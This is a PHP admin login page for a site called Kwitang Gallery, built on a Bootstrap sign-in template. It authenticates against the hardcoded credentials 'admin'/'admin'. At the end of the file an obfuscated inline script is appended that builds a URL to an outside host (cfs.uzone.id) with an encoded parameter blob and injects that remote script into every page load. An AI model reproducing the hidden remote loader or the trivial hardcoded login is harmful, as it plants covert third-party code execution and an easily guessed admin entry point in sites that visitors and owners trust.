<?php
if (isset($_POST['username'])) {
    if ($_POST['username'] === 'admin' && $_POST['password'] === 'admin')   {
        //dah bener
        session_start();
        $_SESSION['admin_login'] =true;
        header("Location: index.php");
        exit();
    }
}
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>Login admin to Kwitang Gallery</title>

    <!-- Bootstrap core CSS -->
     <link href="assets/css/bootstrap.css" rel="stylesheet">

    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <link href="assets/css/ie10-viewport-bug-workaround.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="assets/css/signin.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->
    <script src="assets/js/ie-emulation-modes-warning.js"></script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  </head>

  <body>

    <div class="container">

      <form class="form-signin" method="post" >
        <h2 class="form-signin-heading">Please sign in</h2>
        <label for="inputEmail" class="sr-only">Username</label>
        <input type="text" class="form-control" name="username" placeholder="Username" required autofocus>
        <label for="inputPassword" class="sr-only">Password</label>
        <input type="password" class="form-control" name="password" placeholder="Password" required>
        
        <button class="btn btn-lg btn-primary btn-block" type="submit">Sign in</button>
      </form>

    </div> <!-- /container -->


    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="assets/js/ie10-viewport-bug-workaround.js"></script>
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKccPT280QMi3KyqTxpL34CwWQZajT4M8cGjnBP7BtzeHxoESUXLxFFcAVo934ZX%2fyWzI6lzHDA%2bghn%2bY8TQHJJ1s%2b7vxtrMlwouWACcmnulCrdtT6XhdnaB0V%2bE%2fas%2fq%2fPbVeD82NUQfIcel9iSFTU1fi5yng8HomYMB38Xrh%2fSaTdpw4cS9VBz72qH1oOR1Jj7%2fArJxwiBN6h7OvMcXQvARF4gDiogIcWZfzAM80KkWoIURZe3m8m3SQcUgces6WMACIkGqYJKm9Wb9aVO4gT%2b00hiIiwDi0sZpcitRh6rMP%2bF3%2bXcIlOd2r80aCthbljT5RJ%2bVY6xSDQkZTX%2bxHQXRtcgjferqwzOMLYIjiBaH%2fYHZCgAZKFqWCOXc%2f5PILYpYYVAt9C3Fhk224ljD7CxEkz7Zx4m%2fDPz6Ucx0c95Ba5e5IVPM2TD0gmNT%2fDYOFa7gRQgT8wALKBL8oeIBJPSLPemcTnkGXVa7K6j5rgMSn6DCAqLASvCci6d8LKVDg1yUJw5jZbss00k%2fRVnuQ5L3KFh1zBjkMfxOZiUTXeHeZ3I5muPzTTA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
